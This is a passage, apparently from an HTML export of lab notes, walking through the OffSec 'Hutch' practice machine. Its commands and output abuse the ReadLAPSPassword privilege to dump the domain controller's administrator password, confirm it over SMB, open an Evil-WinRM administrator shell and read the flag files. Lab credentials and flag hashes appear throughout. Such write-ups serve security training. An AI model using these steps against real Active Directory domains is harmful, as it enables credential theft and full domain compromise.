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" alt="ca1adf097f64b52b13670c7e4a7ecc16.png"/><br/>
+We can abuse the <code class="inline-code">ReadLAPSPassword</code> privilege: <a data-from-md="" title="https://www.thehacker.recipes/ad/movement/dacl/readlapspassword" href="https://www.thehacker.recipes/ad/movement/dacl/readlapspassword">https://www.thehacker.recipes/ad/movement/dacl/readlapspassword</a></p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ nxc ldap 192.168.131.122 -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 --module laps 
+LDAP        192.168.131.122 389    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
+LDAP        192.168.131.122 389    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
+LAPS        192.168.131.122 389    HUTCHDC          [*] Getting LAPS Passwords
+LAPS        192.168.131.122 389    HUTCHDC          Computer:HUTCHDC$ User:                Password:na($8t5a$L8n45</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Hutch]</span>
+&boxur;&boxh;$ nxc ldap <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> -d hutch<span class="hljs-selector-class">.offsec</span> -u fmcsorley -<span class="hljs-selector-tag">p</span> CrabSharkJellyfish192 <span class="hljs-attr">--module</span> laps 
+LDAP        <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> <span class="hljs-number">389</span>    HUTCHDC          <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:HUTCHDC) (domain:hutch.offsec)
+LDAP        <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> <span class="hljs-number">389</span>    HUTCHDC          <span class="hljs-selector-attr">[+]</span> hutch.offsec\fmcsorley:CrabSharkJellyfish192 
+LAPS        <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> <span class="hljs-number">389</span>    HUTCHDC          <span class="hljs-selector-attr">[*]</span> Getting LAPS Passwords
+LAPS        <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> <span class="hljs-number">389</span>    HUTCHDC          Computer:HUTCHDC$ User:                Password:<span class="hljs-built_in">na</span>($<span class="hljs-number">8</span>t5a<span class="hljs-variable">$L8n45</span></code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ nxc smb 192.168.131.122 -u Administrator -p &apos;na($8t5a$L8n45&apos;             
+SMB         192.168.131.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False) 
+SMB         192.168.131.122 445    HUTCHDC          [+] hutch.offsec\Administrator:na($8t5a$L8n45 (Pwn3d!)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span><span class="hljs-title class_">Labs</span>/<span class="hljs-title class_">Hutch</span>]
+&boxur;&boxh;<span class="hljs-variable">$ </span>nxc smb <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> -u <span class="hljs-title class_">Administrator</span> -p <span class="hljs-string">&apos;na($8t5a$L8n45&apos;</span>             
+<span class="hljs-variable constant_">SMB</span>         <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> <span class="hljs-number">445</span>    <span class="hljs-variable constant_">HUTCHDC</span>          [*] <span class="hljs-title class_">Windows</span> <span class="hljs-number">10</span> / <span class="hljs-title class_">Server</span> <span class="hljs-number">2019</span> <span class="hljs-title class_">Build</span> <span class="hljs-number">17763</span> x64 (<span class="hljs-symbol">name:</span><span class="hljs-variable constant_">HUTCHDC</span>) (<span class="hljs-symbol">domain:</span>hutch.offsec) (<span class="hljs-symbol">signing:</span><span class="hljs-title class_">True</span>) (<span class="hljs-title class_">SMBv1</span><span class="hljs-symbol">:False</span>) 
+<span class="hljs-variable constant_">SMB</span>         <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> <span class="hljs-number">445</span>    <span class="hljs-variable constant_">HUTCHDC</span>          [+] hutch.offsec\<span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:na</span>(<span class="hljs-variable">$8t</span>5a<span class="hljs-variable">$L8n45</span> (<span class="hljs-title class_">Pwn3d</span>!)</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ evil-winrm -u Administrator -i HUTCHDC   
+Enter Password: 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::2526:63ab:4d97:9f76%3
+   IPv4 Address. . . . . . . . . . . : 192.168.131.122
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.131.254
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ evil-winrm -u Administrator -i HUTCHDC   
+Enter Password: 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::2526:63ab:4d97:9f76%3
+   IPv4 Address. . . . . . . . . . . : 192.168.131.122
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.131.254
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\Users\fmcsorley\Desktop&gt; more local.txt
+1eed1271afa630df85e4e6e21f02a892
+
+*Evil-WinRM* PS C:\Users\fmcsorley\Desktop&gt; more C:\Users\Administrator\Desktop\proof.txt
+c91c08722d3e18e7dba39b1182f54059
+
+*Evil-WinRM* PS C:\Users\fmcsorley\Desktop&gt;</pre><pre class="hljs"><code>*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\fmcsorley\Desktop&gt; more <span class="hljs-keyword">local</span>.txt
+<span class="hljs-number">1</span>eed1271afa630df85e4e6e21f02a892
+
+*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\fmcsorley\Desktop&gt; more <span class="hljs-name">C</span>:\Users\Administrator\Desktop\proof.txt
+c91c08722d3e18e7dba39b1182f54059
+
+*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\fmcsorley\Desktop&gt;</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
